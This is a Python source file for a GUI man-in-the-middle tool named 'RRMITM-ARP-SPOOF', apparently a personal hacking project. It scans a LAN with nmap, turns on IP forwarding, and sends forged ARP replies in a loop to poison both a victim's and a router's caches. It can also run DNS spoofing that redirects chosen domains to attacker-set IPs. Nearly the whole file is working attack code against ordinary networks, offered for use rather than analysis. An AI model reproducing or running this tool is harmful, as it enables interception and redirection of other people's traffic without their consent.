import subprocess as sb
import dns
import webbrowser
import time
import nmap
import threading as th
import tkinter as tk
from scapy.all import *



class GUI:
    macR = ''
    macV = ''

    statoStop = True
    diz = {}
    
    def __init__(self):
        self.app = tk.Tk()

        self.app.geometry("500x300")
        self.app.title("RRMITM-ARP-SPOOF")
        self.app.resizable(False,False)
        self.app.configure(background="black")

        self.menubar = tk.Menu(self.app, bg='black', fg='green')

        self.attacks = tk.Menu(self.menubar, tearoff=0,bg='black', fg='green')
        self.attacks.add_command(label='SCAN IP', command=self.scanIPW)
        self.attacks.add_command(label='ARP SPOOF', command=self.ARP_pois_gui)
        self.attacks.add_command(label='DNS SPOOF', command=self.dnsGui)
        
        self.attacks.add_separator()
        self.attacks.add_command(label='EXIT',command=self.app.quit)
        self.menubar.add_cascade(label='ATTACKS', menu=self.attacks)
        

        self.autore = tk.Menu(self.menubar, tearoff=0, bg='black', fg='green')
        self.autore.add_command(label='AUTORE',command=self.autore1)
        self.menubar.add_cascade(label='AUTORE', menu=self.autore)
        self.app1 = tk.Frame(self.app)
        self.app1.pack(side="top", expand=True, fill="both")
        self.app1.config(bg='black')
        
        self.ARP_pois_gui()
        
        self.app.config(menu=self.menubar)
        

        self.app.mainloop()
    
    def ARP_pois_gui(self):
        
        self.app.geometry("500x300")
        self.app.title("RRMITM-ARP-SPOOF")
        
        self.clear()
        testoRouter = tk.Label(self.app1,text='ROUTER:', bg='black',fg='green')
        testoRouter.place(x=30,y=10)

        self.ipOrmacRouter = tk.Entry(self.app1,fg='green',bg='black')
        self.ipOrmacRouter.place(x=30,y=35)

        testoVittima = tk.Label(self.app1,text='VITTIMA:',fg='green',bg='black')
        testoVittima.place(x=30,y=65)

        self.ipOrmacVittima = tk.Entry(self.app1,fg='green',bg='black')
        self.ipOrmacVittima.place(x=30,y=90)

        self.attackBT = tk.Button(self.app1,activebackground='#5C5858',text='Attack',height=4, width=10, fg='green',bg='black',command=self.attack)
        self.attackBT.place(x=300,y=35)
        self.attackBT.config(state='normal')
        
        self.stopAttackBT = tk.Button(self.app1,fg='green', bg='black', activebackground='#5C5858',height=1, width=10, text='STOP', command=self.stato)
        self.stopAttackBT.place(x=300,y=120)
        self.stopAttackBT.config(state='disable')

        self.var1 = tk.IntVar()
        self.checkbox_dns = tk.Checkbutton(self.app1,text='DNS-SPOOF', variable=self.var1,bg='black', fg='green', onvalue=1, offvalue=0).place(x=30,y=120)


    def stato(self):
        self.statoStop = not self.statoStop
        self.stopAttackBT.config(state='disable')
        self.attackBT.config(state='normal')
        
    def clear(self):
        for wid in self.app1.winfo_children():
            wid.destroy()
        


    def attack(self):
        self.contVittima = self.ipOrmacVittima.get()
        self.contRouter = self.ipOrmacRouter.get()
        self.erroreTx = ''
        

        if self.contVittima == '' or self.contRouter == '':
            self.erroreTx = 'ERRORE TEXT BOX VUOTA'
            self.errore = tk.Label(self.app1, fg='red', bg='black', text=self.erroreTx)
            self.errore.place(x=30,y=160)

        else:
            if self.erroreTx != '':
                self.erroreTx = ''
                self.errore['text'] = self.erroreTx

                
            elif ('.' in self.contRouter and '.' in self.contVittima) and (self.var1.get() == 0):
                self.macR = self.getMacIP(self.contRouter)
                self.macV = self.getMacIP(self.contVittima)
                
                
                self.stopAttackBT.config(state='normal')
                self.attackBT.config(state='disable')
                #start arp spoof
                self.arp = th.Thread(target=self.arpPois)
                self.arp.start()
            
            elif ('.' in self.contRouter and '.' in self.contVittima) and (self.var1.get() == 1):
                self.macR = self.getMacIP(self.contRouter)
                self.macV = self.getMacIP(self.contVittima)

                self.stopAttackBT.config(state='normal')
                self.attackBT.config(state='disable')

                #start arp spoof
                self.arp = th.Thread(target=self.arpPois)
                self.arp.start()

                #start dns spoof
                self.dnsTH = th.Thread(target=self.dnsSpoof)
                self.dnsTH.start()


    def dnsGui(self):
        self.clear()
        self.app.geometry("500x300")
        self.app.title('RRMITM-DNS-SPOOF')

        tk.Label(self.app1,text='DOMAIN:', bg='black', fg='green').place(x=60,y=27)
        self.dnsTarget = tk.Entry(self.app1, bg='black', fg='green')
        self.dnsTarget.place(x=60,y=50)
        

        tk.Label(self.app1, text='IP:', fg='green', bg='black').place(x=60,y=90)
        self.ipSpoof = tk.Entry(self.app1,fg='green', bg='black')
        self.ipSpoof.place(x=60,y=117)

        tk.Button(self.app1, text='ADD', fg='green', bg='black',width=10, height=5, command=self.addDNS).place(x=300,y=48)


    def addDNS(self):
        domain = self.dnsTarget.get()
        ip = self.ipSpoof.get()

        if('.' in ip):
            self.diz[bytes(ip, 'utf-8')] = bytes(domain, 'utf-8')
        
        

    def dnsSpoof(self):
        if self.statoStop:
            
            while self.statoStop:
                try:
                    que = 1

                    snoof = dns.DnsSnoof(self.diz, que)
                    snoof()
                except OSError as error:
                    print('error')
            

    def autore1(self):
        self.clear()
        self.app.geometry("500x300")
        self.app.title('RRMITM-AUTORE')
        nome = tk.Label(self.app1,text='B1M0_404', fg='green', bg='black')
        nome.place(x=200,y=30)

        url = 'https://github.com/b1m0404'

        link = tk.Label(self.app1,text=url,fg="blue", cursor="hand2", bg='black')
        link.place(x=140,y=60)
        link.bind('<Button-1>',lambda e: self.openWeb(url))

      

       


    def openWeb(slef,url):
        webbrowser.open_new_tab(url)

        

    def scanIPW(self):
        self.clear()

        self.app.title('SCAN NETWORK')
        self.app.geometry('300x300')
        
        

        self.ip = tk.Entry(self.app1, bg='black', fg='green')
        self.ip.place(x=50,y=70)

        titolo = tk.Label(self.app1, text='IP AND CIDR:', bg='black',fg='green')
        titolo.place(x=100, y=30)

        self.scanB = tk.Button(self.app1, bg='black', fg='green', text='SCAN', command=self.scan1)
        self.scanB.place(x=110, y=110)


        self.fileIP = tk.Label(self.app1,bg='black', fg='green', text='')
        self.fileIP.place(x=50,y=150)

    
        
   

    def scan1(self):
        scanth = th.Thread(target=self.scan)
        scanth.start()

    def scan(self):
        ip1 = self.ip.get()
        
        self.fileIP['text'] = 'START SCAN'
        self.fileIP.place(x=95,y=150)
        nm = nmap.PortScanner()

        nm.scan(hosts=ip1,arguments='-sn')
        hosts_list = [(x,nm[x]['status']['state']) for x in nm.all_hosts()]

        name_file = 'iplog.txt'
        with open(name_file,'w') as f:
            for host, state in hosts_list:
                stringa = f'{host}\t\t:\t\t{state}\n'
                f.write(stringa)
            f.close()
        self.fileIP['text'] = f'LOG IP SAVED IN {name_file}'
        self.fileIP.place(x=50,y=150)
        
    
    def getMacIP(self, ip):
        ans,_ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=2, verbose=False)
        if ans:
            return ans[0][1].src
    

    def arpPois(self):
        ipv4 = sb.run(['cat', '/proc/sys/net/ipv4/ip_forward'], capture_output=True)
        if ipv4 == '0':
            sb.run(['sysctl','-w', 'net.ipv4.ip_forward=1'], capture_output=True)


    
        mymac = get_if_hwaddr(conf.iface)
        
        while self.statoStop:
            # finata vittima -> router
            packetR = ARP(op="is-at", pdst=self.contVittima, hwdst=self.macV, psrc=self.contRouter)
        
        # finto router -> vittima
            packetV = ARP(op="is-at", pdst=self.contRouter, hwdst=self.macR, psrc=self.contVittima)

            send(packetR, verbose=False)
            send(packetV, verbose=False)
            time.sleep(.3)
            
            
